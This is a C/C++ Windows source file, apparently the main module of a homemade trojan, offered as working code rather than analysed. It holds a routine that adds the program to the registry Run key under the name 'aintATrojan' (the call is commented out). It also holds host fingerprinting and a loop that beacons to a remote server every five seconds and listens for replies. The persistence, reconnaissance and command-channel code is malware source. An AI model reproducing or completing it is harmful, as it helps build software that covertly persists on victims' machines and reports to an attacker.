#define _WINSOCKAPI_

#ifndef WIN32_LEAN_AND_MEAN
#define WIN32_LEAN_AND_MEAN
#endif

#include <winsock2.h>
#include <ws2tcpip.h>
#include <windows.h>
#include <tchar.h>
#include <stdio.h>
#include <stdlib.h>

#include <intrin.h>

#pragma comment (lib, "Ws2_32.lib")
#pragma comment (lib, "Mswsock.lib")
#pragma comment (lib, "AdvApi32.lib")

unsigned int G_UID;

#include "net.h"
#include "fingerprint.h"
#include "fs.h"

#define HKEY_PATH "Software\\Microsoft\\Windows\\CurrentVersion\\Run"

void addToBoot(TCHAR *szPath) {
  char regName[30] = "aintATrojan";
  HKEY newValue;
  RegOpenKey(HKEY_LOCAL_MACHINE, HKEY_PATH, &newValue);
  RegSetValueEx(newValue, regName, 0, REG_SZ, (LPBYTE)szPath, sizeof(szPath));
  RegCloseKey(newValue);
}

int main() {
  G_UID = fingerprint::getUID();

  OSVERSIONINFOEX info = fingerprint::getOSInfo();
  TCHAR ID[64];
  fingerprint::reconOS(ID, &info);

  TCHAR exePath[MAX_PATH];
  GetModuleFileName(NULL, exePath, MAX_PATH);
  // addToBoot(exePath);

  printf("Running in: %s\n", exePath);
  printf(" Bits: %d\n Major: %d\n Minor: %d\n Build: %d\n Platform: %d\n UID: %s\n ID: %s\n",
      fingerprint::is64bits() ? 64 : 32,
      info.dwMajorVersion,
      info.dwMinorVersion,
      info.dwBuildNumber,
      info.dwPlatformId,
      "",
      ID);



  BOOL run = TRUE;
  char buf[BUFFER_LENGTH];
  int buffc;

  SOCKET sock;
  while (run) {
    if (net::createSocket(&sock) == 0 && net::connect(&sock) == 0) {
      net::PACKET * pck = net::newPacket((char*)"testing la vida locah!");
      net::write(&sock, pck);
      free(pck);

      net::listen(&sock, buf, &buffc);
    }
    Sleep(5000);
  }

  net::close(&sock);


  // fingerprint::test();
  // fs::test();
  // net::test();

  return 0;
}
